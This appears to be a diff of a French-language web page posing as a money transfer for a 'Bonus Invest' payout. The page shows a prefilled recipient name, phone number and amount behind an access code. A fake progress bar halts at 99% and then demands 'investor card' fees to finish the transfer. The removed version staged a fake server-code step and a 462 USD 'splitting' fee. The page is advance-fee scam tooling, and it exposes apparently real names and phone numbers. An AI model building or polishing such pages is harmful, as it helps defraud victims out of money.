@@ -5,7 +5,10 @@
   <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
   <title>Transfert d'argent</title>
   <style>
-    * { box-sizing: border-box; }
+    * {
+      box-sizing: border-box;
+    }
+
     body {
       margin: 0;
       font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
@@ -17,6 +20,7 @@
       padding: 20px;
       color: #333;
     }
+
     .card {
       background: rgba(255, 255, 255, 0.95);
       padding: 40px 30px;
@@ -26,8 +30,17 @@
       max-width: 420px;
       animation: fadeIn 0.5s ease-in-out;
     }
-    h1 { color: #1d3557; font-size: 24px; margin-bottom: 25px; }
-    .form-group { margin-bottom: 20px; }
+
+    h1 {
+      color: #1d3557;
+      font-size: 24px;
+      margin-bottom: 25px;
+    }
+
+    .form-group {
+      margin-bottom: 20px;
+    }
+
     label {
       display: block;
       font-weight: 600;
@@ -35,6 +48,7 @@
       margin-bottom: 6px;
       color: #444;
     }
+
     input {
       width: 100%;
       padding: 10px 14px;
@@ -43,15 +57,18 @@
       border-radius: 6px;
       transition: border 0.3s ease;
     }
+
     input:focus {
       border-color: #1d3557;
       outline: none;
     }
+
     input[disabled] {
       background: #f1f1f1;
       color: #666;
       cursor: not-allowed;
     }
+
     .btn {
       width: 100%;
       padding: 12px;
@@ -63,11 +80,16 @@
       cursor: pointer;
       transition: background-color 0.3s ease;
     }
-    .btn:hover { background-color: #0c254d; }
+
+    .btn:hover {
+      background-color: #0c254d;
+    }
+
     .progress-container {
       margin-top: 25px;
       display: none;
     }
+
     .progress-title {
       text-align: center;
       margin-bottom: 8px;
@@ -75,6 +97,7 @@
       font-weight: 600;
       display: none;
     }
+
     .progress-bar-wrapper {
       width: 100%;
       height: 20px;
@@ -83,12 +106,14 @@
       overflow: hidden;
       position: relative;
     }
+
     .progress-bar {
       height: 100%;
       width: 0%;
       background-color: #2a9d8f;
       transition: width 0.4s ease;
     }
+
     .progress-text {
       position: absolute;
       width: 100%;
@@ -98,6 +123,7 @@
       color: #333;
       top: 0;
     }
+
     .notification-message,
     .access-error {
       margin-top: 15px;
@@ -106,18 +132,35 @@
       display: none;
       text-align: center;
     }
-    .notification-message { color: #e76f51; }
-    .access-error { color: #d90429; }
-    @keyframes fadeIn {
-      from { opacity: 0; transform: translateY(20px); }
-      to { opacity: 1; transform: translateY(0); }
+
+    .notification-message {
+      color: #e76f51;
     }
+
+    .access-error {
+      color: #d90429;
+    }
+
+    @keyframes fadeIn {
+      from {
+        opacity: 0;
+        transform: translateY(20px);
+      }
+      to {
+        opacity: 1;
+        transform: translateY(0);
+      }
+    }
+
     @media (max-width: 480px) {
-      .card { padding: 25px 20px; }
+      .card {
+        padding: 25px 20px;
+      }
     }
   </style>
 </head>
 <body>
+
   <div class="card" id="accessContainer">
     <h1>Vérification du Code d'Accès</h1>
     <div class="form-group">
@@ -130,53 +173,47 @@
 
   <div class="card" id="formContainer" style="display: none;">
     <h1>Paiement Bonus Invest</h1>
+
     <form id="tmoneyForm" onsubmit="return false;">
       <div class="form-group">
         <label for="name">Nom et Prénom</label>
-        <input type="text" id="name" value="Rekab Wasivyo" disabled />
+        <input type="text" id="name" value="DAVID Touarikissa" disabled />
       </div>
+
       <div class="form-group">
         <label for="phone">Numéro</label>
-        <input type="tel" id="phone" value="+243 82 547 7601" disabled />
+        <input type="tel" id="phone" value="+242 05 381 4438" disabled />
       </div>
+
       <div class="form-group">
         <label for="amount">Montant à recevoir</label>
-        <input type="text" id="amount" value="11.446 USD" disabled />
+        <input type="text" id="amount" value="322.000 FCFA  " disabled />
       </div>
+
       <button class="btn" type="button" onclick="startProgress()">Procéder</button>
+
       <div class="progress-title" id="progressTitle">Transfert des fonds en cours...</div>
+
       <div class="progress-container" id="progressContainer">
         <div class="progress-bar-wrapper">
           <div class="progress-bar" id="progressBar"></div>
           <div class="progress-text" id="progressPercentage">0%</div>
         </div>
       </div>
-      <div class="notification-message" id="notificationMessage">Action requise : Veuillez payer les frais de finalisation du transfert.</div>
+
+      <div class="notification-message" id="notificationMessage">
+         Action requise : Veillez payer les frais de carte d'investisseur pour terminer le transfert.
+
+      </div>
     </form>
-  </div>
-
-  <div class="card" id="serverCodeContainer" style="display: none;">
-    <h1>Validation Sécurisée</h1>
-    <div class="form-group">
-      <label for="serverCode">Entrez le numéro de votre serveur</label>
-      <input type="text" id="serverCode" placeholder="Ex: 123" />
-    </div>
-    <button class="btn" onclick="validateServerCode()">Valider</button>
-    <div class="access-error" id="serverError">Numéro de serveur incorrect.</div>
-  </div>
-
-  <div class="card" id="splitContainer" style="display: none;">
-    <h1>Erreur de Transfert</h1>
-    <p>Votre compte ne peut pas recevoir ce montant. Vos bénéfices doivent être morcelés pour garantir le transfert sécurisé.</p>
-    <p><strong>Frais de morcellement : 462 USD</strong></p>
-    <button class="btn" onclick="showPopup()">Payer les frais de morcellement</button>
   </div>
 
   <script>
     function checkAccessCode() {
       const code = document.getElementById("accessCode").value;
       const error = document.getElementById("accessError");
-      if (code === "7601") {
+
+      if (code === "4438") {
         error.style.display = "none";
         document.getElementById("accessContainer").style.display = "none";
         document.getElementById("formContainer").style.display = "block";
@@ -193,8 +230,9 @@
       let progress = 0;
       const progressBar = document.getElementById("progressBar");
       const progressPercentage = document.getElementById("progressPercentage");
+
       const totalTime = 2 * 60 * 1000;
-      const maxProgress = 100;
+      const maxProgress = 99;
       const intervalTime = totalTime / maxProgress;
 
       const interval = setInterval(() => {
@@ -204,28 +242,10 @@
           progressPercentage.textContent = progress + "%";
         } else {
           clearInterval(interval);
-          document.getElementById("formContainer").style.display = "none";
-          document.getElementById("serverCodeContainer").style.display = "block";
+          document.getElementById("notificationMessage").style.display = "block";
         }
       }, intervalTime);
     }
-
-    function validateServerCode() {
-      const code = document.getElementById("serverCode").value;
-      const error = document.getElementById("serverError");
-      if (code === "207") {
-        error.style.display = "none";
-        document.getElementById("serverCodeContainer").style.display = "none";
-        document.getElementById("splitContainer").style.display = "block";
-      } else {
-        error.style.display = "block";
-      }
-    }
-
-    function showPopup() {
-      alert("Veuillez contacter le responsable de l'entreprise pour procéder au paiement des frais de morcellement.");
-      location.reload();
-    }
   </script>
 </body>
-</html>
+</html>.
